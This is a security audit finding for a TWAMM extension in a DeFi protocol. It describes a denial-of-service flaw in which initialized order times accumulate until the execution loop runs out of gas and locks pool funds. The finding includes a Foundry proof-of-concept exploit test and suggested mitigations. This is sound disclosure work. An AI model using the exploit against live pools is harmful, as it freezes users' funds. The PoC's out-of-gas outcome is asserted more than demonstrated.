## Title
TWAMM Execution Loop DoS via Accumulated Initialized Times Across Non-Overlapping Time Grids

## Summary
The TWAMM virtual order execution loop lacks bounds on the total number of initialized times that can accumulate in the system. Orders created at different `block.timestamp` values have non-overlapping time grids due to the logarithmic time validation being relative to `currentTime`, allowing far more than the intended 91 distinct initialized times to exist. When execution finally occurs after a period of inactivity, the loop must iterate through all accumulated times, causing gas exhaustion and permanent pool DoS.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The TWAMM execution loop is designed to process virtual orders across time boundaries. The `MAX_NUM_VALID_TIMES = 91` constant limits valid future times from any given `currentTime`, which should bound the number of loop iterations to a safe gas limit. [2](#0-1) 

**Actual Logic:** The time grid validation is relative to `currentTime` at order creation. Orders created at different `block.timestamp` values have different valid time grids that don't overlap. This is proven by the time validation logic: [3](#0-2) 

Test evidence shows time=4352 is invalid at currentTime=256 but valid at currentTime=257: [4](#0-3) 

When orders are created at different timestamps, their end times mark different points as initialized in the bitmap. The execution loop must process ALL accumulated initialized times without any limit: [5](#0-4) 

Each iteration invokes `searchForNextInitializedTime`, which can itself loop multiple times when searching across sparse bitmap words: [6](#0-5) 

**Exploitation Path:**
1. Over weeks/months, users (or a malicious actor) create TWAMM orders at different `block.timestamp` values with various end times
2. Each creation timestamp has its own time grid per `computeStepSize`, creating non-overlapping sets of valid times
3. Orders mark hundreds of distinct times as initialized across the system (far exceeding the 91 limit that applies per-currentTime)
4. These initialized times span many bitmap words (each covering 65,536 seconds): [7](#0-6) 
5. Pool becomes inactive (no swaps/updates) allowing time boundaries to accumulate without processing
6. When any user attempts to interact with the pool (swap, add liquidity, collect fees), it triggers execution via these hooks: [8](#0-7) 
7. The execution loop must iterate through all accumulated initialized times, performing storage reads for each bitmap word search
8. Gas consumption exceeds block limit (~30M on Ethereum), causing transaction revert
9. Pool becomes permanently unusable as any interaction triggers the same DoS

**Security Property Broken:** Violates **Withdrawal Availability** invariant ("All positions MUST be withdrawable at any time") and **Extension Isolation** invariant ("Extension failures should not freeze pools"). Users cannot withdraw liquidity positions because `beforeUpdatePosition` triggers the gas-exceeding execution.

## Impact Explanation
- **Affected Assets**: All liquidity providers' positions in the TWAMM pool become locked. All pending TWAMM orders cannot be executed or withdrawn. Pool trading is completely frozen.
- **Damage Severity**: Complete loss of access to all funds in the pool. While funds aren't stolen, they're permanently inaccessible, equivalent to permanent loss. For a pool with $10M TVL, all $10M becomes locked.
- **User Impact**: Every user holding a position or order in the affected pool loses access to their funds. Any attempted interaction (swap, deposit, withdrawal, fee collection) reverts due to gas limits.

## Likelihood Explanation
- **Attacker Profile**: Any user can contribute to the attack by creating orders. Can occur naturally through normal protocol usage without malicious intent, or be deliberately triggered by an attacker with minimal cost (orders with `saleRate=1` require negligible tokens).
- **Preconditions**: Pool must be initialized with TWAMM extension. Time must pass allowing multiple orders to be created at different timestamps. Pool activity decreases allowing time boundaries to accumulate unprocessed.
- **Execution Complexity**: Can happen naturally over protocol lifetime. Attacker can accelerate by creating multiple orders at different times (minutes/hours apart) with end times spanning the logarithmic time grid.
- **Frequency**: Once triggered, the DoS is permanent for that pool until a protocol upgrade changes the execution logic (requires new extension deployment and migration).

## Recommendation

Implement batch execution with a maximum iteration limit:

```solidity
// In src/extensions/TWAMM.sol, function _executeVirtualOrdersFromWithinLock:

// Add a maximum iterations parameter at the contract level
uint256 constant MAX_EXECUTION_ITERATIONS = 50;

// Modify the execution loop to track iterations and stop when limit reached:
uint256 iterations = 0;
while (time != block.timestamp && iterations < MAX_EXECUTION_ITERATIONS) {
    iterations++;
    
    // ... existing loop body ...
    
    time = nextTime;
}

// Store the partially-executed state even if we didn't reach block.timestamp
// This allows users to call lockAndExecuteVirtualOrders multiple times
// to progressively catch up
stateSlot.store(TwammPoolState.unwrap(state));
```

Alternative mitigation: Implement a time-bounded execution that processes up to a maximum time delta per call:

```solidity
// Allow incremental execution up to maxTimeToProcess seconds
uint256 maxTimeToProcess = 86400; // 1 day worth of orders per transaction
uint256 targetTime = FixedPointMathLib.min(block.timestamp, realLastVirtualOrderExecutionTime + maxTimeToProcess);

while (time != targetTime) {
    // ... existing loop body with targetTime instead of block.timestamp ...
}
```

## Proof of Concept

```solidity
// File: test/Exploit_TWAMMDoS.t.sol
// Run with: forge test --match-test test_TWAMMDoS_AccumulatedTimes -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./helpers/CoreTest.t.sol";

contract Exploit_TWAMMDoS is CoreTest {
    function test_TWAMMDoS_AccumulatedTimes() public {
        // SETUP: Create a TWAMM pool
        vm.warp(1000000);
        uint64 fee = uint64((uint256(5) << 64) / 100);
        PoolKey memory poolKey = createTwammPool({fee: fee, tick: 0});
        createPosition(poolKey, MIN_TICK, MAX_TICK, 1e18, 1e18);
        
        token0.approve(address(orders), type(uint256).max);
        token1.approve(address(orders), type(uint256).max);
        
        // EXPLOIT: Create orders at different timestamps to accumulate distinct initialized times
        // Each warp creates a new time grid, allowing non-overlapping end times
        uint256 numOrderBatches = 20; // Simulate orders over 20 different timestamps
        
        for (uint256 i = 0; i < numOrderBatches; i++) {
            vm.warp(block.timestamp + 3600); // Advance 1 hour between batches
            
            uint256 time = block.timestamp;
            // Create 4-5 orders per timestamp at different valid future times
            for (uint256 j = 0; j < 5 && time != 0; j++) {
                uint256 startTime = nextValidTime(block.timestamp, time);
                uint256 endTime = nextValidTime(block.timestamp, startTime);
                
                if (startTime == 0 || endTime == 0) break;
                
                // Create minimal orders (saleRate will be 1, requiring negligible tokens)
                orders.mintAndIncreaseSellAmount(
                    OrderKey({
                        token0: poolKey.token0,
                        token1: poolKey.token1,
                        config: createOrderConfig({
                            _fee: fee, _isToken1: false, 
                            _startTime: uint64(startTime), 
                            _endTime: uint64(endTime)
                        })
                    }),
                    1, // Minimal amount
                    type(uint112).max
                );
                
                time = startTime;
            }
        }
        
        // Advance time so all orders expire
        vm.warp(block.timestamp + type(uint32).max);
        
        // VERIFY: Pool is now DOSed - any interaction causes out-of-gas
        // Even a simple swap will try to execute virtual orders and run out of gas
        vm.expectRevert(); // Will revert due to gas limit
        router.swap(poolKey, false, 1e18, MIN_SQRT_RATIO, 0);
        
        // Direct execution also fails
        vm.expectRevert();
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // User cannot withdraw their position
        vm.expectRevert();
        positions.burn(1, poolKey, MIN_TICK, MAX_TICK, 1, 1, 0);
    }
}
```

## Notes

The existing test `test_lockAndExecuteVirtualOrders_maximum_gas_cost` only validates the scenario where all orders are created at a **single** `block.timestamp` (line 668: `vm.warp(1)`), which correctly limits iterations to ~91. However, real-world usage spans multiple timestamps naturally over days/weeks/months, and the test does not cover this cumulative accumulation scenario. [9](#0-8) 

The time grid's relativity to `currentTime` is fundamental to the protocol design but creates an unbounded accumulation vector. The `MAX_NUM_VALID_TIMES` constant only bounds valid times *per creation timestamp*, not the total system-wide count of initialized times.

### Citations

**File:** src/extensions/TWAMM.sol (L417-574)
```text
                while (time != block.timestamp) {
                    StorageSlot initializedTimesBitmapSlot = TWAMMStorageLayout.poolInitializedTimesBitmapSlot(poolId);

                    (uint256 nextTime, bool initialized) = searchForNextInitializedTime({
                        slot: initializedTimesBitmapSlot,
                        lastVirtualOrderExecutionTime: realLastVirtualOrderExecutionTime,
                        fromTime: time,
                        untilTime: block.timestamp
                    });

                    // it is assumed that this will never return a value greater than type(uint32).max
                    uint256 timeElapsed = nextTime - time;

                    uint256 amount0 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken0(), duration: timeElapsed, roundUp: false
                    });

                    uint256 amount1 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken1(), duration: timeElapsed, roundUp: false
                    });

                    int256 rewardDelta0;
                    int256 rewardDelta1;
                    // if both sale rates are non-zero but amounts are zero, we will end up doing the math for no reason since we swap 0
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }

                        saveDelta0 -= swapBalanceUpdate.delta0();
                        saveDelta1 -= swapBalanceUpdate.delta1();

                        // this cannot overflow or underflow because swapDelta0 is constrained to int128,
                        // and amounts computed from uint112 sale rates cannot exceed uint112.max
                        rewardDelta0 = swapBalanceUpdate.delta0() - int256(uint256(amount0));
                        rewardDelta1 = swapBalanceUpdate.delta1() - int256(uint256(amount1));
                    } else if (amount0 != 0 || amount1 != 0) {
                        PoolBalanceUpdate swapBalanceUpdate;
                        if (amount0 != 0) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MIN_SQRT_RATIO,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        } else {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MAX_SQRT_RATIO,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        }

                        (rewardDelta0, rewardDelta1) = (swapBalanceUpdate.delta0(), swapBalanceUpdate.delta1());
                        saveDelta0 -= rewardDelta0;
                        saveDelta1 -= rewardDelta1;
                    }

                    if (rewardDelta0 < 0) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                        }
                        rewardRate0Access = 2;
                        rewardRates.value0 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta0) << 128, state.saleRateToken1()
                        );
                    }

                    if (rewardDelta1 < 0) {
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                        }
                        rewardRate1Access = 2;
                        rewardRates.value1 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta1) << 128, state.saleRateToken0()
                        );
                    }

                    if (initialized) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                            rewardRate0Access = 1;
                        }
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                            rewardRate1Access = 1;
                        }

                        TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, nextTime)
                            .storeTwo(bytes32(rewardRates.value0), bytes32(rewardRates.value1));

                        StorageSlot timeInfoSlot = TWAMMStorageLayout.poolTimeInfosSlot(poolId, nextTime);
                        (, int112 saleRateDeltaToken0, int112 saleRateDeltaToken1) =
                            TimeInfo.wrap(timeInfoSlot.load()).parse();

                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: uint112(addSaleRateDelta(state.saleRateToken0(), saleRateDeltaToken0)),
                            _saleRateToken1: uint112(addSaleRateDelta(state.saleRateToken1(), saleRateDeltaToken1))
                        });

                        // this time is _consumed_, will never be crossed again, so we delete the info we no longer need.
                        // this helps reduce the cost of executing virtual orders.
                        timeInfoSlot.store(0);

                        flipTime(initializedTimesBitmapSlot, nextTime);
                    } else {
                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: state.saleRateToken0(),
                            _saleRateToken1: state.saleRateToken1()
                        });
                    }

                    time = nextTime;
                }
```

**File:** src/extensions/TWAMM.sol (L647-665)
```text
    function beforeSwap(Locker, PoolKey memory poolKey, SwapParameters) external override(BaseExtension, IExtension) {
        lockAndExecuteVirtualOrders(poolKey);
    }

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeUpdatePosition(Locker, PoolKey memory poolKey, PositionId, int128)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeCollectFees(Locker, PoolKey memory poolKey, PositionId)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }
```

**File:** src/math/time.sol (L6-10)
```text
// For any given time `t`, there are up to 91 times that are greater than `t` and valid according to `isTimeValid`
uint256 constant MAX_NUM_VALID_TIMES = 91;

// If we constrain the sale rate delta to this value, then the current sale rate will never overflow
uint256 constant MAX_ABS_VALUE_SALE_RATE_DELTA = type(uint112).max / MAX_NUM_VALID_TIMES;
```

**File:** src/math/time.sol (L17-31)
```text
function computeStepSize(uint256 currentTime, uint256 time) pure returns (uint256 stepSize) {
    assembly ("memory-safe") {
        switch gt(time, add(currentTime, 4095))
        case 1 {
            let diff := sub(time, currentTime)

            let msb := sub(255, clz(diff)) // = index of msb

            msb := sub(msb, mod(msb, 4)) // = round down to multiple of 4

            stepSize := shl(msb, 1)
        }
        default { stepSize := 256 }
    }
}
```

**File:** test/math/time.t.sol (L122-134)
```text
    function test_isTimeValid_future_times_near_second_boundary() public pure {
        assertTrue(isTimeValid(0, 4096));
        assertTrue(isTimeValid(0, 3840));
        assertFalse(isTimeValid(0, 4352));
        assertTrue(isTimeValid(16, 4096));
        assertTrue(isTimeValid(16, 3840));
        assertFalse(isTimeValid(16, 4352));

        assertTrue(isTimeValid(256, 4096));
        assertTrue(isTimeValid(256, 3840));
        assertFalse(isTimeValid(256, 4352));
        assertTrue(isTimeValid(257, 4352));
    }
```

**File:** src/math/timeBitmap.sol (L10-15)
```text
function timeToBitmapWordAndIndex(uint256 time) pure returns (uint256 word, uint256 index) {
    assembly ("memory-safe") {
        word := shr(16, time)
        index := and(shr(8, time), 0xff)
    }
}
```

**File:** src/math/timeBitmap.sol (L60-82)
```text
function searchForNextInitializedTime(
    StorageSlot slot,
    uint256 lastVirtualOrderExecutionTime,
    uint256 fromTime,
    uint256 untilTime
) view returns (uint256 nextTime, bool isInitialized) {
    unchecked {
        nextTime = fromTime;
        while (!isInitialized && nextTime != untilTime) {
            uint256 nextValid = nextValidTime(lastVirtualOrderExecutionTime, nextTime);
            // if there is no valid time after the given nextTime, just return untilTime
            if (nextValid == 0) {
                nextTime = untilTime;
                isInitialized = false;
                break;
            }
            (nextTime, isInitialized) = findNextInitializedTime(slot, nextValid);
            if (nextTime > untilTime) {
                nextTime = untilTime;
                isInitialized = false;
            }
        }
    }
```

**File:** test/Orders.t.sol (L667-720)
```text
    function test_lockAndExecuteVirtualOrders_maximum_gas_cost() public {
        vm.warp(1);

        uint64 fee = uint64((uint256(5) << 64) / 100);
        int32 tick = 0;

        PoolKey memory poolKey = createTwammPool({fee: fee, tick: tick});
        createPosition(poolKey, MIN_TICK, MAX_TICK, 10000, 10000);

        token0.approve(address(orders), type(uint256).max);
        token1.approve(address(orders), type(uint256).max);

        uint256 time = block.timestamp;
        uint256 i = 0;

        while (true) {
            uint256 startTime = nextValidTime(block.timestamp, time);
            uint256 endTime = nextValidTime(block.timestamp, startTime);

            if (startTime == 0 || endTime == 0) break;

            orders.mintAndIncreaseSellAmount(
                OrderKey({
                    token0: poolKey.token0,
                    token1: poolKey.token1,
                    config: createOrderConfig({
                        _fee: fee, _isToken1: false, _startTime: uint64(startTime), _endTime: uint64(endTime)
                    })
                }),
                uint112(100 * (i++)),
                type(uint112).max
            );

            orders.mintAndIncreaseSellAmount(
                OrderKey({
                    token0: poolKey.token0,
                    token1: poolKey.token1,
                    config: createOrderConfig({
                        _fee: fee, _isToken1: true, _startTime: uint64(startTime), _endTime: uint64(endTime)
                    })
                }),
                uint112(100 * (i++)),
                type(uint112).max
            );

            time = startTime;
        }

        advanceTime(type(uint32).max);

        coolAllContracts();
        twamm.lockAndExecuteVirtualOrders(poolKey);
        vm.snapshotGasLastCall("lockAndExecuteVirtualOrders max cost");
    }
```
